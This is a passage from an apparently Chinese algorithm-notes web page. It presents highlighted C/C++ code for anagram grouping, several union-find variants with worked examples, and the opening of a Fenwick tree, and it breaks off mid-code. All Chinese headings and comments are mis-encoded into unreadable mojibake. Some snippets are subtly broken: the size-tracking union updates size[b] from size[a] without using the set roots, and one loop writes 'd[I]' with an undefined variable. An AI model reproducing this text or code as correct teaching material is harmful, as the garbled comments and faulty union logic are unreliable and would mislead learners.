title="å­—æ¯å¼‚ä½è¯åˆ†ç»„"></a>å­—æ¯å¼‚ä½è¯åˆ†ç»„</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br>public:<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt;&gt; groupAnagrams(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt;&amp; strs) &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt;&gt; h;  <span class="hljs-comment">// å“ˆå¸Œè¡¨ï¼Œé”®æ˜¯æ’åºåçš„å­—ç¬¦ä¸²</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; str : strs) &#123;<br>            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> key = str;<br>            <span class="hljs-built_in">std</span>::sort(key.begin(), key.end());  <span class="hljs-comment">// å°†å­—ç¬¦ä¸²æ’åº</span><br>            h[key].push_back(str);  <span class="hljs-comment">// å°†åŸå§‹å­—ç¬¦ä¸²åŠ å…¥å“ˆå¸Œè¡¨</span><br>        &#125;<br>        <br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt;&gt; result;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; p : h) &#123;<br>            result.push_back(p.second);  <span class="hljs-comment">// æ”¶é›†ç»“æœ</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><p>++++</p><h2 id="åä¸€-å¹¶æŸ¥é›†"><a href="#åä¸€-å¹¶æŸ¥é›†" class="headerlink" title="åä¸€.å¹¶æŸ¥é›†"></a>åä¸€.å¹¶æŸ¥é›†</h2><p>1.è¿”å›ä¸¤ä¸ªé›†åˆæ˜¯å¦ç›¸åŒï¼šæŸ¥ä¸Šæ¸¸æ˜¯å¦æ˜¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæœ€åä¸€ä¸ªèŠ‚ç‚¹æŒ‡å‘è‡ªå·±</p><p>2.å–å¹¶é›†ï¼šå°æŒ‚å¤§ä¸Š</p><h3 id="æœ´ç´ å¹¶æŸ¥é›†"><a href="#æœ´ç´ å¹¶æŸ¥é›†" class="headerlink" title="æœ´ç´ å¹¶æŸ¥é›†"></a>æœ´ç´ å¹¶æŸ¥é›†</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">4 5</span><br><span class="hljs-comment">U 1 2 å°†èŠ‚ç‚¹ 1 å’Œ 2 åˆå¹¶åˆ°åŒä¸€ä¸ªé›†åˆ</span><br><span class="hljs-comment">U 3 4</span><br><span class="hljs-comment">F 1 3</span><br><span class="hljs-comment">U 2 3</span><br><span class="hljs-comment">F 1 3</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;  <span class="hljs-comment">// å‡è®¾èŠ‚ç‚¹æ•°çš„æœ€å¤§å€¼</span><br><span class="hljs-type">int</span> p[N];  <span class="hljs-comment">// å­˜å‚¨æ¯ä¸ªç‚¹çš„ç¥–å®—èŠ‚ç‚¹</span><br><br><span class="hljs-comment">// è¿”å›xçš„å¤§ç¥–å®—èŠ‚ç‚¹</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) &#123; <span class="hljs-comment">//è‡ªå·±ä¸æ˜¯ç¥–å®—</span><br>        p[x] = find(p[x]);  <span class="hljs-comment">// è·¯å¾„å‹ç¼©ï¼Œå‘ä¸Šæ‰¾ç¥–å®—</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n, m;  <span class="hljs-comment">// n:èŠ‚ç‚¹æ•°, m:æ“ä½œæ•°</span><br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; m;<br><br>    <span class="hljs-comment">// åˆå§‹åŒ–ï¼Œå‡å®šèŠ‚ç‚¹ç¼–å·æ˜¯1~n</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        p[i] = i;  <span class="hljs-comment">// æ¯ä¸ªèŠ‚ç‚¹çš„ç¥–å®—èŠ‚ç‚¹æ˜¯è‡ªå·±</span><br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (m--) &#123;<br>        <span class="hljs-type">char</span> op;  <span class="hljs-comment">// æ“ä½œç±»å‹ï¼Œ&#x27;U&#x27; è¡¨ç¤º Unionï¼Œ&#x27;F&#x27; è¡¨ç¤º Find</span><br>        <span class="hljs-type">int</span> a, b;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; op &gt;&gt; a &gt;&gt; b;<br><br>        <span class="hljs-keyword">if</span> (op == <span class="hljs-string">&#x27;U&#x27;</span>) &#123;<br>            <span class="hljs-comment">// åˆå¹¶æ“ä½œ</span><br>            p[find(a)] = find(b); <span class="hljs-comment">//açš„å¤§ç¥–å®—çš„ä¸Šä¸€ä¸ªç¥–å®—å˜æˆbçš„å¤§ç¥–å®—ï¼Œp[]æŒ‡ä¸Šä¸€ä¸ªç¥–å®—</span><br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-string">&#x27;F&#x27;</span>) &#123;<br>            <span class="hljs-comment">// æŸ¥è¯¢æ“ä½œï¼Œè¾“å‡ºaå’Œbæ˜¯å¦å±äºåŒä¸€ä¸ªé›†åˆ</span><br>            <span class="hljs-keyword">if</span> (find(a) == find(b)) &#123;<br>                <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;YES&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// a å’Œ b åœ¨åŒä¸€é›†åˆ</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;NO&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// a å’Œ b ä¸åœ¨åŒä¸€é›†åˆ</span><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="ç»´æŠ¤sizeçš„å¹¶æŸ¥é›†ï¼š"><a href="#ç»´æŠ¤sizeçš„å¹¶æŸ¥é›†ï¼š" class="headerlink" title="ç»´æŠ¤sizeçš„å¹¶æŸ¥é›†ï¼š"></a>ç»´æŠ¤sizeçš„å¹¶æŸ¥é›†ï¼š</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">//  p = [2, 2, 3, 4, 5]   // 1 æŒ‚åˆ° 2 ä¸‹  size = [1, 2, 1, 1, 1] // 2 å˜æˆç¥–å®—ï¼Œå¤§å°å˜ä¸º 2</span><br><br><br><br><span class="hljs-type">int</span> p[N], size[N];<span class="hljs-comment">//ä»¥iä¸ºèŠ‚ç‚¹çš„å®¶åº­æœ‰å¤šå°‘äººï¼ˆåŒ…æ‹¬è‡ªå·±ï¼‰</span><br>    <span class="hljs-comment">//p[]å­˜å‚¨æ¯ä¸ªç‚¹çš„ç¥–å®—èŠ‚ç‚¹, size[]åªæœ‰ç¥–å®—èŠ‚ç‚¹çš„æœ‰æ„ä¹‰ï¼Œè¡¨ç¤ºç¥–å®—èŠ‚ç‚¹æ‰€åœ¨é›†åˆä¸­çš„ç‚¹çš„æ•°é‡</span><br>    <span class="hljs-comment">// è¿”å›xçš„ç¥–å®—èŠ‚ç‚¹</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) p[x] = find(p[x]);<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-comment">// åˆå§‹åŒ–ï¼Œå‡å®šèŠ‚ç‚¹ç¼–å·æ˜¯1~n</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    p[i] = i;<br>    size[i] = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">// åˆå¹¶aå’Œbæ‰€åœ¨çš„ä¸¤ä¸ªé›†åˆï¼š</span><br>p[find(a)] = find(b);<br>size[b] += size[a];<br></code></pre></td></tr></table></figure><h3 id="ç»´æŠ¤åˆ°ç¥–å®—èŠ‚ç‚¹è·ç¦»çš„å¹¶æŸ¥é›†ï¼š"><a href="#ç»´æŠ¤åˆ°ç¥–å®—èŠ‚ç‚¹è·ç¦»çš„å¹¶æŸ¥é›†ï¼š" class="headerlink" title="ç»´æŠ¤åˆ°ç¥–å®—èŠ‚ç‚¹è·ç¦»çš„å¹¶æŸ¥é›†ï¼š"></a>ç»´æŠ¤åˆ°ç¥–å®—èŠ‚ç‚¹è·ç¦»çš„å¹¶æŸ¥é›†ï¼š</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//p = [2, 2, 3, 4, 5]   // 1 â†’ 2   d = [3, 0, 0, 0, 0]   // d[1] = 3ï¼ˆ1 åˆ° 2 çš„åç§»é‡ï¼‰</span><br><br><span class="hljs-type">int</span> p[N], d[N];<br>    <span class="hljs-comment">//p[]å­˜å‚¨æ¯ä¸ªç‚¹çš„ç¥–å®—èŠ‚ç‚¹, d[x]å­˜å‚¨xåˆ°p[x]çš„è·ç¦» xåˆ°ä¸Šä¸ªç¥–å®—çš„è·ç¦»</span><br><br><span class="hljs-comment">// è¿”å›xçš„ç¥–å®—èŠ‚ç‚¹</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x)<br>    &#123;<br>        <span class="hljs-type">int</span> u = find(p[x]);<br>        d[x] += d[p[x]];<br>        p[x] = u;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><span class="hljs-comment">// åˆå§‹åŒ–ï¼Œå‡å®šèŠ‚ç‚¹ç¼–å·æ˜¯1~n</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    p[i] = i;<br>    d[I] = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// åˆå¹¶aå’Œbæ‰€åœ¨çš„ä¸¤ä¸ªé›†åˆï¼š</span><br>p[find(a)] = find(b);<br>d[find(a)] = distance; <span class="hljs-comment">// æ ¹æ®å…·ä½“é—®é¢˜ï¼Œåˆå§‹åŒ–find(a)çš„åç§»é‡</span><br></code></pre></td></tr></table></figure><h3 id="ä¾‹é¢˜-4"><a href="#ä¾‹é¢˜-4" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="æœ‹å‹åœˆé—®é¢˜"><a href="#æœ‹å‹åœˆé—®é¢˜" class="headerlink" title="æœ‹å‹åœˆé—®é¢˜"></a>æœ‹å‹åœˆé—®é¢˜</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">205</span>; <span class="hljs-comment">// å‡è®¾æœ€å¤šæœ‰ 200 ä¸ªåŸå¸‚</span><br><span class="hljs-type">int</span> p[N]; <span class="hljs-comment">// è®°å½•æ¯ä¸ªåŸå¸‚çš„ç¥–å®—èŠ‚ç‚¹</span><br><span class="hljs-comment">// æŸ¥æ‰¾ x çš„ç¥–å®—èŠ‚ç‚¹ï¼ˆå¸¦è·¯å¾„å‹ç¼©ï¼‰</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) p[x] = find(p[x]); <span class="hljs-comment">// è®© x ç›´æ¥æŒ‡å‘æ ¹ï¼Œä¼˜åŒ–æŸ¥è¯¢é€Ÿåº¦</span><br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-comment">// åˆå¹¶ a å’Œ b æ‰€åœ¨çš„é›†åˆ</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">unite</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>    p[find(a)] = find(b); <span class="hljs-comment">// è®© a çš„ç¥–å®—æŒ‡å‘ b çš„ç¥–å®—ï¼Œåˆå¹¶ä¸¤ä¸ªé›†åˆ</span><br>&#125;<br><span class="hljs-comment">// è®¡ç®—çœä»½æ•°é‡</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">findCircleNum</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; isConnected)</span> &#123;<br>    <span class="hljs-type">int</span> n = isConnected.size(); <span class="hljs-comment">// åŸå¸‚æ•°é‡</span><br>    <span class="hljs-comment">// åˆå§‹åŒ–å¹¶æŸ¥é›†ï¼Œæ¯ä¸ªåŸå¸‚çš„ç¥–å®—æ˜¯è‡ªå·±</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) p[i] = i;<br>    <span class="hljs-comment">// éå†ä¸Šä¸‰è§’çŸ©é˜µï¼Œåˆå¹¶ç›¸è¿çš„åŸå¸‚</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>            <span class="hljs-keyword">if</span> (isConnected[i][j]) &#123;<br>                unite(i, j); <span class="hljs-comment">// ç›´æ¥è¿æ¥çš„åŸå¸‚åˆå¹¶åˆ°åŒä¸€é›†åˆ</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// ç»Ÿè®¡ä¸åŒçš„ç¥–å®—èŠ‚ç‚¹æ•°é‡</span><br>    <span class="hljs-built_in">unordered_set</span>&lt;<span class="hljs-type">int</span>&gt; provinces;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        provinces.insert(find(i)); <span class="hljs-comment">// æ‰¾åˆ° i çš„ç¥–å®—èŠ‚ç‚¹</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> provinces.size(); <span class="hljs-comment">// ç¥–å®—èŠ‚ç‚¹çš„ä¸ªæ•°å°±æ˜¯çœä»½æ•°</span><br>&#125;<br><br><span class="hljs-comment">// ä¸»å‡½æ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; isConnected = &#123;<br>        &#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;<br>    &#125;;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; findCircleNum(isConnected) &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-comment">// è¾“å‡ºçœä»½æ•°é‡</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="å²›å±¿é—®é¢˜"><a href="#å²›å±¿é—®é¢˜" class="headerlink" title="å²›å±¿é—®é¢˜"></a>å²›å±¿é—®é¢˜</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">int</span> p[N], size[N];  <span class="hljs-comment">// p[] è®°å½•çˆ¶èŠ‚ç‚¹, size[] è®°å½•é›†åˆå¤§å°</span><br><span class="hljs-type">int</span> count;  <span class="hljs-comment">// è®°å½•å½“å‰å²›å±¿æ•°é‡</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) p[x] = find(p[x]);  <span class="hljs-comment">// è·¯å¾„å‹ç¼©</span><br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">unite</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-type">int</span> fx = find(x), fy = find(y);<br>    <span class="hljs-keyword">if</span> (fx != fy) &#123;<br>        p[fx] = fy;<br>        count--;  <span class="hljs-comment">// åˆå¹¶åå²›å±¿æ•°å‡å°‘</span><br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">numIslands</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; grid)</span> &#123;<br>    <span class="hljs-keyword">if</span> (grid.empty()) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> rows = grid.size(), cols = grid[<span class="hljs-number">0</span>].size();<br>    count = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// åˆå§‹åŒ–å¹¶æŸ¥é›†</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rows * cols; i++) p[i] = i;<br>    <span class="hljs-comment">// éå†çŸ©é˜µ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rows; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; cols; j++) &#123;<br>            <span class="hljs-keyword">if</span> (grid[i][j] == <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>                count++;  <span class="hljs-comment">// å‘ç°ä¸€ä¸ªæ–°çš„å²›å±¿</span><br>                <span class="hljs-type">int</span> idx = i * cols + j;<br>                <span class="hljs-comment">// å‘å³åˆå¹¶</span><br>                <span class="hljs-keyword">if</span> (j + <span class="hljs-number">1</span> &lt; cols &amp;&amp; grid[i][j + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;1&#x27;</span>) unite(idx, idx + <span class="hljs-number">1</span>);<br>                <span class="hljs-comment">// å‘ä¸‹åˆå¹¶</span><br>                <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span> &lt; rows &amp;&amp; grid[i + <span class="hljs-number">1</span>][j] == <span class="hljs-string">&#x27;1&#x27;</span>) unite(idx, idx + cols);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&gt; grid = &#123;<br>        &#123;<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>&#125;,<br>        &#123;<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>&#125;,<br>        &#123;<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>&#125;,<br>        &#123;<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>&#125;<br>    &#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; numIslands(grid) &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// è¾“å‡º 1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="åäºŒ-æ ‘çŠ¶æ•°ç»„"><a href="#åäºŒ-æ ‘çŠ¶æ•°ç»„" class="headerlink" title="åäºŒ.æ ‘çŠ¶æ•°ç»„"></a>åäºŒ.æ ‘çŠ¶æ•°ç»„</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FenwickTree</span> &#123;</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; t;<br>    <br>    FenwickTree(<span class="hljs-type">int</span> n) : t(n + <span 